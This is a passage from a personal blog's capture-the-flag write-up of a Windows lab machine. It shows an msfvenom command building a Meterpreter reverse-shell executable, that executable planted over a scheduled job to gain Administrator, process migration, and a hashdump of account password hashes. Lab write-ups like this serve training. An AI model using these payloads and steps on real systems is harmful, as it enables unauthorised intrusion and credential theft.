</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>/<span style=color:#ae81ff>18</span>/<span style=color:#ae81ff>20</span> <span style=color:#ae81ff>15</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>01</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>01</span>,Event Started Ok, (Administrator)
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>/<span style=color:#ae81ff>18</span>/<span style=color:#ae81ff>20</span> <span style=color:#ae81ff>15</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>01</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>33</span>,<span style=color:#66d9ef>Process</span> Ended. PID<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>1340</span>,ExitCode<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>4</span>,Message.exe (Administrator)
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>/<span style=color:#ae81ff>18</span>/<span style=color:#ae81ff>20</span> <span style=color:#ae81ff>15</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>02</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>01</span>,Event Started Ok, (Administrator)
</span></span></code></pre></div><p>I generated a new binary called Message.exe that included a meterpreter payload that connected back to port 4443 and started a second listener on this port</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf/transfer# msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style=color:#f92672>=</span>10.10.7.59 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>4443</span> -f exe -o Message.exe
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> No arch selected, selecting arch: x86 from the payload                                                                                                            
</span></span><span style=display:flex><span>No encoder specified, outputting raw payload                                                                                                                          
</span></span><span style=display:flex><span>Payload size: <span style=color:#ae81ff>341</span> bytes
</span></span><span style=display:flex><span>Final size of exe file: <span style=color:#ae81ff>73802</span> bytes
</span></span><span style=display:flex><span>Saved as: Message.exe%
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; cd ../
</span></span><span style=display:flex><span>meterpreter &gt; upload /root/ctf/transfer/Message.exe 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> uploading  : /root/ctf/transfer/Message.exe -&gt; Message.exe
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Uploaded 72.07 KiB of 72.07 KiB <span style=color:#f92672>(</span>100.0%<span style=color:#f92672>)</span>: /root/ctf/transfer/Message.exe -&gt; Message.exe
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> uploaded   : /root/ctf/transfer/Message.exe -&gt; Message.exe
</span></span><span style=display:flex><span>meterpreter &gt; 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending stage <span style=color:#f92672>(</span><span style=color:#ae81ff>176195</span> bytes<span style=color:#f92672>)</span> to 10.10.167.66
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Meterpreter session <span style=color:#ae81ff>2</span> opened <span style=color:#f92672>(</span>10.10.7.59:4443 -&gt; 10.10.167.66:49273<span style=color:#f92672>)</span> at 2020-11-18 23:09:00 +0000
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>meterpreter &gt; backgoround 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Backgrounding session 1...
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; sessions 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Active sessions
</span></span><span style=display:flex><span><span style=color:#f92672>===============</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  Id  Name  Type                     Information                        Connection
</span></span><span style=display:flex><span>  --  ----  ----                     -----------                        ----------
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>1</span>         meterpreter x64/windows  IIS APPPOOL<span style=color:#ae81ff>\B</span>log @ HACKPARK        10.10.7.59:4444 -&gt; 10.10.167.66:49250 <span style=color:#f92672>(</span>10.10.167.66<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>2</span>         meterpreter x86/windows  HACKPARK<span style=color:#ae81ff>\A</span>dministrator @ HACKPARK  10.10.7.59:4443 -&gt; 10.10.167.66:49273 <span style=color:#f92672>(</span>10.10.167.66<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; sessions <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting interaction with 2...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>meterpreter &gt; getpid
</span></span><span style=display:flex><span>Current pid: <span style=color:#ae81ff>1260</span>
</span></span><span style=display:flex><span>meterpreter &gt; getuid
</span></span><span style=display:flex><span>Server username: HACKPARK<span style=color:#ae81ff>\A</span>dministrator
</span></span></code></pre></div><p>Success! I had an administrative account. I decided to move the session to a stabler process than the one i currently had, with the print spooler being my default first choice.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>meterpreter &gt; ps
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>Process</span> List
</span></span><span style=display:flex><span>============
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> PID   PPID  Name                  Arch  Session  User                          Path
</span></span><span style=display:flex><span> ---   ----  ----                  ----  -------  ----                          ----
</span></span><span style=display:flex><span> <span style=color:#ae81ff>0</span>     <span style=color:#ae81ff>0</span>     [<span style=color:#66d9ef>System Process</span>]                                                   
</span></span><span style=display:flex><span> <span style=color:#ae81ff>4</span>     <span style=color:#ae81ff>0</span>     System                x64   <span style=color:#ae81ff>0</span>                                      
</span></span><span style=display:flex><span> <span style=color:#ae81ff>368</span>   <span style=color:#ae81ff>4</span>     smss.exe              x64   <span style=color:#ae81ff>0</span>                                      
</span></span><span style=display:flex><span> <span style=color:#ae81ff>520</span>   <span style=color:#ae81ff>512</span>   csrss.exe             x64   <span style=color:#ae81ff>0</span>                                      
</span></span><span style=display:flex><span> <span style=color:#ae81ff>580</span>   <span style=color:#ae81ff>568</span>   csrss.exe             x64   <span style=color:#ae81ff>1</span>                                      
</span></span><span style=display:flex><span> <span style=color:#ae81ff>588</span>   <span style=color:#ae81ff>512</span>   wininit.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>616</span>   <span style=color:#ae81ff>568</span>   winlogon.exe          x64   <span style=color:#ae81ff>1</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>672</span>   <span style=color:#ae81ff>588</span>   services.exe          x64   <span style=color:#ae81ff>0</span>                                      
</span></span><span style=display:flex><span> <span style=color:#ae81ff>740</span>   <span style=color:#ae81ff>672</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>784</span>   <span style=color:#ae81ff>672</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>820</span>   <span style=color:#ae81ff>672</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>868</span>   <span style=color:#ae81ff>616</span>   dwm.exe               x64   <span style=color:#ae81ff>1</span>        Window Manager\DWM-<span style=color:#ae81ff>1</span>          C:\Windows\System32\dwm.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>876</span>   <span style=color:#ae81ff>672</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>904</span>   <span style=color:#ae81ff>672</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>964</span>   <span style=color:#ae81ff>672</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1020</span>  <span style=color:#ae81ff>672</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1156</span>  <span style=color:#ae81ff>672</span>   amazon-ssm-agent.exe  x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1216</span>  <span style=color:#ae81ff>672</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1236</span>  <span style=color:#ae81ff>672</span>   LiteAgent.exe         x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1292</span>  <span style=color:#ae81ff>672</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1356</span>  <span style=color:#ae81ff>672</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1372</span>  <span style=color:#ae81ff>672</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1388</span>  <span style=color:#ae81ff>672</span>   WService.exe          x86   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\PROGRA~<span style=color:#ae81ff>2</span>\SYSTEM~<span style=color:#ae81ff>1</span>\WService.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1548</span>  <span style=color:#ae81ff>1388</span>  WScheduler.exe        x86   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\PROGRA~<span style=color:#ae81ff>2</span>\SYSTEM~<span style=color:#ae81ff>1</span>\WScheduler.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1652</span>  <span style=color:#ae81ff>672</span>   Ec2Config.exe         x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1740</span>  <span style=color:#ae81ff>740</span>   WmiPrvSE.exe          x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1756</span>  <span style=color:#ae81ff>672</span>   spoolsv.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1988</span>  <span style=color:#ae81ff>672</span>   msdtc.exe             x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2412</span>  <span style=color:#ae81ff>1200</span>  WScheduler.exe        x86   <span style=color:#ae81ff>1</span>        HACKPARK\Administrator        C:\Program Files (x86)\SystemScheduler\WScheduler.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2536</span>  <span style=color:#ae81ff>2412</span>  Message.exe           x86   <span style=color:#ae81ff>1</span>        HACKPARK\Administrator        C:\PROGRA~<span style=color:#ae81ff>2</span>\SYSTEM~<span style=color:#ae81ff>1</span>\Message.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2588</span>  <span style=color:#ae81ff>904</span>   taskhostex.exe        x64   <span style=color:#ae81ff>1</span>        HACKPARK\Administrator        C:\Windows\System32\taskhostex.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2664</span>  <span style=color:#ae81ff>2656</span>  explorer.exe          x64   <span style=color:#ae81ff>1</span>        HACKPARK\Administrator        C:\Windows\explorer.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>3064</span>  <span style=color:#ae81ff>2612</span>  ServerManager.exe     x64   <span style=color:#ae81ff>1</span>        HACKPARK\Administrator        C:\Windows\System32\ServerManager.exe
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>meterpreter &gt; migrate <span style=color:#ae81ff>1756</span>
</span></span><span style=display:flex><span>[*] Migration completed successfully.
</span></span></code></pre></div><p>Finally I dumped the credential hashes for a fun flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>meterpreter &gt; hashdump 
</span></span><span style=display:flex><span>Administrator<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>500</span><span style=color:#960050;background-color:#1e0010>:</span>aad3b435b51404eeaad3b435b51404ee<span style=color:#960050;background-color:#1e0010>:</span>3352c0731470aabf133e0c84276adcba::<span style=color:#960050;background-color:#1e0010>:</span>
</span></span><span style=display:flex><span>Guest<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>501</span><span style=color:#960050;background-color:#1e0010>:</span>aad3b435b51404eeaad3b435b51404ee<span style=color:#960050;background-color:#1e0010>:</span>31d6cfe0d16ae931b73c59d7e0c089c0::<span style=color:#960050;background-color:#1e0010>:</span>
</span></span><span style=display:flex><span>jeff<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>1001</span><span style=color:#960050;background-color:#1e0010>:</span>aad3b435b51404eeaad3b435b51404ee<span style=color:#960050;background-color:#1e0010>:</span>e7dd0bd78b1d5d7eea4ee746816e2377::<span style=color:#960050;background-color:#1e0010>:</span>
</span></span></code></pre></div><h2 id=summary>Summary <a href=#summary class=anchor>üîó</a></h2><p>This host was interesting solely due to the potential that Scheduler service provided. By functioning like cron I was able to trigger a connection attempt at a 30 second interval giving me persistence for as long as that job was running the same binary. One thing I could have tried to do further was leverage templating in msfvenom to persist the binary with a backdoor added. All in all this was a fun way for me to continue experimenting with windows hosts.</p></div><div class=tags><a href=https://ncatelli.github.io/tags/ctf>ctf</a>
<a href=https://ncatelli.github.io/tags/boot2root>boot2root</a>
<a href=https://ncatelli.github.io/tags/hacking>hacking</a>
<a href=https://ncatelli.github.io/tags/writeup>writeup</a>
<a href=https://ncatelli.github.io/tags/tryhackme>tryhackme</a></div></section></main><footer id=footer><div id=social><a class=symbol href=https://github.com/ncatelli/ rel=me target=_blank><svg fill="#bbb" width="28" height="28" viewBox="0 0 72 72" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><title>Github</title><desc>Created with Sketch.</desc><defs/><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)"><g id="Github" transform="translate(264.000000, 939.000000)"><path d="M8 72H64c4.418278.0 8-3.581722 8-8V8c0-4.418278-3.581722-8-8-8H8c-4.418278 811624501e-24-8 3.581722-8 8V64c541083001e-24 4.418278 3.581722 8 8 8z" id="Rounded" fill="#bbb"/><path d="M35.9985 13C22.746 13 12 23.7870921 12 37.096644c0 10.6440272 6.876 19.6751861 16.4145 22.8617681C29.6145 60.1797862 30.0525 59.4358488 30.0525 58.7973276 30.0525 58.2250681 30.0315 56.7100863 30.0195 54.6996482c-6.6765 1.4562499-8.085-3.2302544-8.085-3.2302544-1.0905-2.7829884-2.664-3.5239139-2.664-3.5239139C17.091 46.4500754 19.4355 46.4801943 19.4355 46.4801943c2.4075.1701719 3.675 2.4833051 3.675 2.4833051 2.142 3.6820383 5.6175 2.6188404 6.9855 2.0014024C30.3135 49.4077535 30.9345 48.3460615 31.62 47.7436831 26.2905 47.1352808 20.688 45.0691228 20.688 35.8361671c0-2.6308879.9345-4.781379 2.4705-6.4665327C22.911 28.7597262 22.0875 26.3110578 23.3925 22.9934585c0 0 2.016-.6475568 6.6 2.4697516C31.908 24.9285993 33.96 24.6620468 36.0015 24.6515052 38.04 24.6620468 40.0935 24.9285993 42.0105 25.4632101c4.581-3.1173084 6.5925-2.4697516 6.5925-2.4697516C49.9125 26.3110578 49.089 28.7597262 48.8415 29.3696344 50.3805 31.0547881 51.309 33.2052792 51.309 35.8361671c0 9.2555448-5.6115 11.29309-10.9575 11.8894446.860999999999997.7439374 1.629 2.2137408 1.629 4.4621184C41.9805 55.4089489 41.9505 58.0067059 41.9505 58.7973276 41.9505 59.4418726 42.3825 60.1918338 43.6005 59.9554002 53.13 56.7627944 60 47.7376593 60 37.096644 60 23.7870921 49.254 13 35.9985 13" fill="#fff"/></g></g></g></svg></a></div><div class=copyright></div></footer></body></html>